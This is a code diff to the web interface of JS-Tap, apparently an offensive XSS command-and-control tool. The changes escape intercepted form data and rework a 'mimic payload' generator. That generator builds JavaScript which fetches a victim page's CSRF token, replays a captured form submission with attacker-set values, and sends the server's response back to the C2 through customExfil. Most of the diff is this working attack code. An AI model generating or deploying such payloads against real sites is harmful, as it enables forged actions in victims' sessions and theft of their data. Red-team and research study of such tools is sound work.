@@ -6,13 +6,20 @@ let tokenUrl         = "";
 
 function escapeHTML(string) 
 {
-    return string
+    if (string === undefined || string === null) 
+    {
+        return '';
+    }
+
+    return String(string)
         .replace(/&/g, "&amp;")
         .replace(/</g, "&lt;")
         .replace(/>/g, "&gt;")
         .replace(/"/g, "&quot;")
         .replace(/'/g, "&#039;");
 }
+
+
 
 
 function showClientFilterModal()
@@ -954,9 +961,9 @@ async function showCustomPayloadModal(skipClear)
 		{
 			console.log("Clearing all jobs!");
 			fetch('/api/clearAllPayloadJobs')
-				.then(response => {
-					refreshSavedPayloadList();
-				});
+			.then(response => {
+				refreshSavedPayloadList();
+			});
 		}
 
 		clearJobsButton.blur();
@@ -1095,7 +1102,7 @@ async function searchToken(eventKey, tokenName, tokenValue)
 {
 	var searchDataDiv = document.getElementById('searchDataDiv');
 
-    searchDataDiv.innerHTML = "";
+	searchDataDiv.innerHTML = "";
 
 	tokenSearchReq = await fetch('/api/formCsrfTokenSearch/' + eventKey, {
 		method:"POST",
@@ -1114,10 +1121,10 @@ async function searchToken(eventKey, tokenName, tokenValue)
 
 	searchData.innerHTML  = '<b>CSRF Token URL:</b><br>' + tokenSearchJson.url + '<br><br>';
 	searchData.innerHTML += '<b>CSRF Token file:</b><br>' + tokenSearchJson.fileName + '<br><br>';
-  	searchData.innerHTML += '<button type="button" class="btn btn-primary" onclick=downloadHtmlCode(' + `'` + tokenSearchJson.fileName + `'`+ ')>Download Code</button><br><br>';
-  	searchData.innerHTML += '<b>Click "Next" to build payload</b>';
-  	tokenUrl = tokenSearchJson.url;
-  	searchDataDiv.appendChild(searchData);
+	searchData.innerHTML += '<button type="button" class="btn btn-primary" onclick=downloadHtmlCode(' + `'` + tokenSearchJson.fileName + `'`+ ')>Download Code</button><br><br>';
+	searchData.innerHTML += '<b>Click "Next" to build payload</b>';
+	tokenUrl = tokenSearchJson.url;
+	searchDataDiv.appendChild(searchData);
 }
 
 
@@ -1139,17 +1146,12 @@ async function showMimicFormModal(eventKey, formDataString)
 
 	formData = JSON.parse(formDataString);
 
-	formName    = formData.name;
+	formName    = escapeHTML(formData.name);
 	formContent = escapeHTML(atob(formData.data));
 	formAction  = escapeHTML(atob(formData.action))
-	formMethod  = formData.method;
-	formEncType = formData.encType;
-
-
-	console.log("Form action: " + formAction);
-	console.log("Method: " + formMethod);
-	console.log("Content: " + formContent);
-
+	formMethod  = escapeHTML(formData.method);
+	formEncType = escapeHTML(formData.encType);
+	formURL     = escapeHTML(formData.url);
 
 	var formDataDiv   = document.getElementById('formDataDiv');
 	var searchDataDiv = document.getElementById('searchDataDiv');
@@ -1157,93 +1159,96 @@ async function showMimicFormModal(eventKey, formDataString)
 	formDataDiv.innerHTML = "";
 
 	var data = document.createElement('p');
-    data.innerHTML  = '<b>Form Name:</b> ' + formName + '<br>';
-    data.innerHTML += '<b>Action:</b> ' + formAction + '<br>';
-    data.innerHTML += '<b>Method:</b> ' + formMethod + '<br>';
-    data.innerHTML += '<b>Encoding Type:</b> ' + formEncType + '<br><br>';
+	data.innerHTML  = '<b>Form URL:</b> ' + formURL + '<br>';
+	data.innerHTML += '<b>Form Name:</b> ' + formName + '<br>';
+	data.innerHTML += '<b>Action:</b> ' + formAction + '<br>';
+	data.innerHTML += '<b>Method:</b> ' + formMethod + '<br>';
+	data.innerHTML += '<b>Encoding Type:</b> ' + formEncType + '<br><br>';
 
-    data.innerHTML += '<b>Content:</b>' + '<br>';
+	data.innerHTML += '<b>Content:</b>' + '<br>';
 
 	formattedContent = formContent.replace(/\n/g, '<br>');
 
 	formattedContent = formattedContent.replace(/^<br>/, '');
-    data.innerHTML  += formattedContent;
+	data.innerHTML  += formattedContent;
 
     // Append the paragraph to the dynamic div
-    formDataDiv.appendChild(data);
+	formDataDiv.appendChild(data);
 
-    searchDataDiv.innerHTML = "";
+	searchDataDiv.innerHTML = "";
 
-    searchButton.onclick = function(event) 
-    {
-    	var canSearch = true;
+	searchButton.onclick = function(event) 
+	{
+		var canSearch = true;
 
-    	if (csrfName.value.trim() === "")
-    	{
-    		csrfName.classList.add('is-invalid');
-    		canSearch = false;
-    	}
-    	else
-    	{
-    		csrfName.classList.remove('is-invalid');
-    	}
+		if (csrfName.value.trim() === "")
+		{
+			csrfName.classList.add('is-invalid');
+			canSearch = false;
+		}
+		else
+		{
+			csrfName.classList.remove('is-invalid');
+		}
 
-    	if (csrfValue.value.trim() === "")
-    	{
-    		csrfValue.classList.add('is-invalid');
-     		canSearch = false;
-	   	}
-    	else
-    	{
-    		csrfValue.classList.remove('is-invalid');
-    	}
+		if (csrfValue.value.trim() === "")
+		{
+			csrfValue.classList.add('is-invalid');
+			canSearch = false;
+		}
+		else
+		{
+			csrfValue.classList.remove('is-invalid');
+		}
 
-    	if (canSearch)
-    	{
-    		searchToken(eventKey, csrfName.value.trim(), csrfValue.value.trim())
-    	}
+		if (canSearch)
+		{
+			searchToken(eventKey, csrfName.value.trim(), csrfValue.value.trim())
+		}
 
-    	searchButton.blur();
-    }
+		searchButton.blur();
+	}
 
     // Prep our form parameters/values
-    var lines      = formContent.trim().split('\n');
- 
-    var parsedForm = lines.map(line => {
-    	var parts      = line.trim().split(':');
-    	return {
-    		key: parts[0].trim(),
-    		value: parts[1].trim()
-    	};
-    });
+	var lines = formContent.trim().split('\n');
 
-    console.log("--Parsed form: ");
-    console.log(parsedForm);
+	var parsedForm = lines.map(line => {
+		var parts = line.trim().split(':');
+		return {
+			key: parts[0].trim(),
+			value: parts[1].trim()
+		};
+	});
+
+    // console.log("--Parsed form: ");
+    // console.log(parsedForm);
 
 
     // Generate a mimic payload
-    nextButton.onclick = function(event)
-    {
+	nextButton.onclick = function(event)
+	{
     	// Let's generate that payload
-    	var payload = "";
+		var payload = "";
 
-    	payload += "// JS-Tap mimic generated payload\n";
-    	payload += "// Payload variables below with intercepted values. Modify as you see fit.\n";
-    	payload += "// ----------------------------------------------------------------------.\n";
+		payload += "// JS-Tap mimic generated payload\n";
+		payload += "// Payload variables below with intercepted values. Modify as you see fit.\n";
+		payload += "// ----------------------------------------------------------------------.\n";
 
-    	parsedForm.forEach(item => {
+		parsedForm.forEach(item => {
+			var variableName = item.key.replace(/-/g, '_');
+
     		// Skip the CSRF variable, we'll handle that later automatically
-    		if (item.key.trim() === csrfName.value.trim())
-    		{
-    			return;
-    		}
+			if (item.key.trim() === csrfName.value.trim())
+			{
+				return;
+			}
 
-    		payload += `var var_${item.key} = '${item.value}';\n`;
-    	});
-    	payload += "// ----------------------------------------------------------------------.\n";
+			payload += `var var_${variableName} = '${item.value}';\n`;
+		});
+		payload += "// ----------------------------------------------------------------------.\n";
 
 	    // Default type on null
-		if (formEncType === null || formAction === undefined || formAction === '' || formAction === 'null')
+		if (formEncType === null || formEncType === undefined || formEncType === '' || formEncType === 'null')
 		{
 			formEncType = "'application/x-www-form-urlencoded'";
 		}
@@ -1251,103 +1256,113 @@ async function showMimicFormModal(eventKey, formDataString)
 		// Defaults to current page if null, so the page with the CSRF token
 		if (formAction === null || formAction === undefined || formAction === '' || formAction === 'null')
 		{
-			formAction = tokenUrl;
+			formAction = formURL;
 		}
 
-    	payload += "\n\n";
+		payload += "\n\n";
+
+		var haveCSRF = false;
+
+		if (searchDataDiv.innerHTML != "")
+		{
+			haveCSRF = true;
+		}
 
     	// Check if we have a CSRF token to deal with
-    	if (searchDataDiv.innerHTML != "")
-    	{
+		if (haveCSRF)
+		{
     		// There is a CSRF token to contend with
-    		console.log("** Generating payload with a CSRF token...");
-    		payload += "// Get the CSRF token first\n";
-    		payload += "fetch('" + tokenUrl + "')\n";
-    		payload += "	.then(response =>{\n";
-    		payload += "		if(!response.ok){\n";
-    		payload += "			customExfil('Error', 'Error fetching CSRF Token with Mimic payload');\n";
-    		payload += "            throw new Error('Error fetching CSRF Token with Mimic payload');\n";
-    		payload += "		}\n";
-    		payload += "		return response.text();\n";
-    		payload += "	})\n";
-    		payload += "	.then(text => {\n";
-    		payload += "		var fetchedContent = text;\n";
-    		payload += "		var parser         = new DOMParser();\n";
-    		payload += "		var parsedDoc      = parser.parseFromString(fetchedContent, 'text/html');\n";
-    		payload += `		var tokenInput     = parsedDoc.querySelector('input[name="` + csrfName.value + `"]');\n`;
-      		payload += "		\n";
-	  		payload += "		return tokenInput ? tokenInput.value : null;\n";
-    		payload += "	})\n";
-    		payload += "	.then(csrfToken => {\n";
-    		payload += "		if (!csrfToken) {\n";
-    		payload += "			customExfil('Error', 'Error using CSRF Token in mimic payload');\n";
-     		payload += "            throw new Error('Error using CSRF Token in Mimic payload');\n";
-   			payload += "		}\n\n";
-			payload += "		var bodyData = {\n";
+			console.log("** Generating payload with a CSRF token...");
+			payload += "// Get the CSRF token first\n";
+			payload += "fetch('" + tokenUrl + "')\n";
+			payload += "	.then(response =>{\n";
+			payload += "		if(!response.ok){\n";
+			payload += "			customExfil('Error', 'Error fetching CSRF Token with Mimic payload');\n";
+			payload += "            throw new Error('Error fetching CSRF Token with Mimic payload');\n";
+			payload += "		}\n";
+			payload += "		return response.text();\n";
+			payload += "	})\n";
+			payload += "	.then(text => {\n";
+			payload += "		var fetchedContent = text;\n";
+			payload += "		var parser         = new DOMParser();\n";
+			payload += "		var parsedDoc      = parser.parseFromString(fetchedContent, 'text/html');\n";
+			payload += `		var tokenInput     = parsedDoc.querySelector('input[name="` + csrfName.value + `"]');\n`;
+			payload += "		\n";
+			payload += "		return tokenInput ? tokenInput.value : null;\n";
+			payload += "	})\n";
+			payload += "	.then(csrfToken => {\n";
+			payload += "		if (!csrfToken) {\n";
+			payload += "			customExfil('Error', 'Error using CSRF Token in mimic payload');\n";
+			payload += "            throw new Error('Error using CSRF Token in Mimic payload');\n";
+			payload += "		}\n\n";
+		}
+		
+		payload += "		var bodyData = {\n";
 
-			parsedForm.forEach((item, index, array) => {
-				var variableName = item.key.replace(/-/g, '_');
+		parsedForm.forEach((item, index, array) => {
+			var variableName = item.key.replace(/-/g, '_');
 
-				// Skip the CSRF variable, we'll handle that after the loop
-    			if (item.key.trim() === csrfName.value.trim())
-    			{
-    				return;
-    			}
+			// Skip the CSRF variable, we'll handle that after the loop
+			if (item.key.trim() === csrfName.value.trim())
+			{
+				return;
+			}
 
-		    	payload += `			"${item.key}": var_${variableName},\n`;
-			});
+			payload += `			"${item.key}": var_${variableName},\n`;
+		});
+		if (haveCSRF)
+		{
 			payload += `			"${csrfName.value.trim()}": csrfToken\n`;
-			payload += "		};\n";
+		}
+		payload += "		};\n";
 
-    		payload += "		// Final request is below:\n";
-    		payload += "		fetch('" + formAction + "', {\n";
-    		payload += `			method: '${formMethod}',\n`;
-    		payload += "			headers: {\n";
-    		payload += `				'Content-Type': ${formEncType},\n`;
-    		payload += "			},\n";
+		payload += "		// Final request is below:\n";
+		payload += "		fetch('" + formAction + "', {\n";
+		payload += `			method: '${formMethod}',\n`;
+		payload += "			headers: {\n";
+		payload += `				'Content-Type': ${formEncType},\n`;
+		payload += "			},\n";
 
-    		// console.log("$$$$$ encType: " + formEncType);
-    		if (formEncType == "'application/x-www-form-urlencoded'")
-    		{
+		// console.log("$$$$$ encType: " + formEncType);
+		if (formEncType == "'application/x-www-form-urlencoded'")
+		{
 
-    			payload += "			body: Object.keys(bodyData).map(key => encodeURIComponent(key) + '=' + encodeURIComponent(bodyData[key])).join('&')\n";
-    		}
-    		else if (formEncType == "'application/json'")
-    		{
-    			payload += "			body: JSON.stringify(bodyData)\n";
-    		}
-    		else
-    		{
-    			console.log("*** Error, this encoding type not handled yet");
-    			alert('Error in mimic generator, unhandled form encoding type:\n' + formEncType);
-    		}
+			payload += "			body: Object.keys(bodyData).map(key => encodeURIComponent(key) + '=' + encodeURIComponent(bodyData[key])).join('&')\n";
+		}
+		else if (formEncType == "'application/json'")
+		{
+			payload += "			body: JSON.stringify(bodyData)\n";
+		}
+		else
+		{
+			console.log("*** Error, this encoding type not handled yet");
+			alert('Error in mimic generator, unhandled form encoding type:\n' + formEncType);
+		}
 
-    		payload += "		})\n";
-    		payload += "		.then(response => {\n";
-    		payload += "			var statusCode   = response.status;\n";
-    		payload += "			return response.text().then(responseBody => {\n";
-    		payload += "				customExfil('Payload Response, Status code: ' + statusCode, 'Response Body:' + responseBody);\n";
-    		payload += "			});\n";
-    		payload += "		})\n";
-    		payload += "        .catch(error => {\n";
-    		payload += "			customExfil('Error', 'Caught error in mimic payload');\n";
-    		payload += "		})\n";
-    		payload += "	});\n";
+		payload += "		})\n";
+		payload += "		.then(response => {\n";
+		payload += "			var statusCode   = response.status;\n";
+		payload += "			return response.text().then(responseBody => {\n";
+		payload += "				customExfil('Payload Response, Status code: ' + statusCode, 'Response Body:' + responseBody);\n";
+		payload += "			});\n";
+		payload += "		})\n";
+		payload += "        .catch(error => {\n";
+		payload += "			customExfil('Error', 'Caught error in mimic payload');\n";
+		payload += "		})\n";
+
+		if (haveCSRF)
+		{
+			payload += "	});\n";
+		}
 
 
-    		console.log("Generated payload:");
-    		console.log(payload);
-    	} 	
-    	else
-    	{
-    		// There is no CSRF token to contend with
-    		console.log("-- Generating payload withough a CSRF token...");
-    	}
+		console.log("Generated payload:");
+		console.log(payload);
 
-    	nextButton.blur();
+		nextButton.blur();
 
     	// Ok, now we need to push this into the C2 system
-    	var payloadNameInput   = document.getElementById('payloadName');
+		var payloadNameInput   = document.getElementById('payloadName');
 		var payloadDescription = document.getElementById('payloadDescription');
 		var payloadCode        = document.getElementById('payload-editor');
 
@@ -1355,9 +1370,9 @@ async function showMimicFormModal(eventKey, formDataString)
 		payloadDescription.value = "Automatically generated custom payload from form submission.";
 		payloadCode.value        = payload;
 
-    	modal.hide();
-    	showCustomPayloadModal(true);
-    }
+		modal.hide();
+		showCustomPayloadModal(true);
+	}
 
 	var modal = new bootstrap.Modal(document.getElementById('createFormMimicModal'));
 	modal.show();
@@ -1623,18 +1638,20 @@ async function getClientDetails(id)
   		splitFormData  = formData.split('\n');
 
   		cardTitle.innerHTML = "Form Submission";
-  		cardText.innerHTML += "Action: <b>" + escapeHTML(atob(formPostJson.action)) + "</b>";
-  		cardText.innerHTML += "<br>";
-  		cardText.innerHTML += "Method: <b>" + formPostJson.method + "</b>";
+  		cardText.innerHTML += "URL: <b>" + escapeHTML(formPostJson.url) + "</b>";
    		cardText.innerHTML += "<br>";
+ 		cardText.innerHTML += "Action: <b>" + escapeHTML(atob(formPostJson.action)) + "</b>";
+  		cardText.innerHTML += "<br>";
+  		cardText.innerHTML += "Method: <b>" + escapeHTML(formPostJson.method) + "</b>";
+  		cardText.innerHTML += "<br>";
   		cardText.innerHTML += "Data:";
-  	  	cardText.innerHTML += "<br>";
-  	  	cardText.innerHTML += splitFormData.map(line => "<b>" + line + "</b>").join("<br>");
-   	  	cardText.innerHTML += "<br>";
+  		cardText.innerHTML += "<br>";
+  		cardText.innerHTML += splitFormData.map(line => "<b>" + line + "</b>").join("<br>");
+  		cardText.innerHTML += "<br>";
 
-   	  	jsonDataString = JSON.stringify(formPostJson).replace(/"/g, '&quot;');
-		cardText.innerHTML += `<button type="button" class="btn btn-primary" onclick="showMimicFormModal('${eventKey}', '${jsonDataString}')">Create Mimic Payload</button>`;
-	}
+  		jsonDataString = JSON.stringify(formPostJson).replace(/"/g, '&quot;');
+  		cardText.innerHTML += `<button type="button" class="btn btn-primary" onclick="showMimicFormModal('${eventKey}', '${jsonDataString}')">Create Mimic Payload</button>`;
+  	}
   	break;
 
 
@@ -1950,13 +1967,13 @@ async function updateClients()
 
   if (client.hasJobs)
   {
-	  cardText.innerHTML += '<button type="button" class="btn btn-primary btn-sm" style="float: right;border-width:2px;border-color:green" onclick=showSingleClientPayloadModal(event,' + `'` 
-	  + client.id + `'`+ ')>Run Payload</button>';  
-	}	
+  	cardText.innerHTML += '<button type="button" class="btn btn-primary btn-sm" style="float: right;border-width:2px;border-color:green" onclick=showSingleClientPayloadModal(event,' + `'` 
+  	+ client.id + `'`+ ')>Run Payload</button>';  
+  }	
   else
   {
-	  cardText.innerHTML += '<button type="button" class="btn btn-primary btn-sm" style="float: right;" onclick=showSingleClientPayloadModal(event,' + `'` 
-	  + client.id + `'`+ ')>Run Payload</button>';
+  	cardText.innerHTML += '<button type="button" class="btn btn-primary btn-sm" style="float: right;" onclick=showSingleClientPayloadModal(event,' + `'` 
+  	+ client.id + `'`+ ')>Run Payload</button>';
   }
 
 
